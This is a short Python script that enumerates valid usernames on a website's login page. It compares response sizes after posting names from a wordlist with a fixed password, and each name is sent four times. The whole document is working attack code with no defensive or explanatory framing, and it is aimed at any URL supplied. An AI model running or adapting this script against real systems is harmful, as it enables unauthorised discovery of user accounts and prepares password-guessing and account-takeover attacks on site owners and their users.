import requests
import time

# Replace with the URL you want to send the request to, should be end with /login
url = "https://www.example.com/login"

# save the user names in a file called users.txt
file_path = 'usernames.txt'

# get a length when an invalid user is submitted and save it as in a variable invalid_user_output_size

data = {
        'username': 'abc',
        'password': '12345'
        }

response = requests.post(url, data=data)
response_content = response.content
invalid_user_output_size = len(response_content)


# Open the file in read mode
with open(file_path, 'r') as file:
    # Read each line from the file
    for line in file:
        user = line.strip()    
        data = {
        'username': user,
        'password': '12345'
        }
        # repeat the request for 4 times
        for i in range(1,5): 
          response = requests.post(url, data=data)
        content = response.content
        response_size = len(content)
        if invalid_user_output_size!= response_size :
          print(user)
          break
        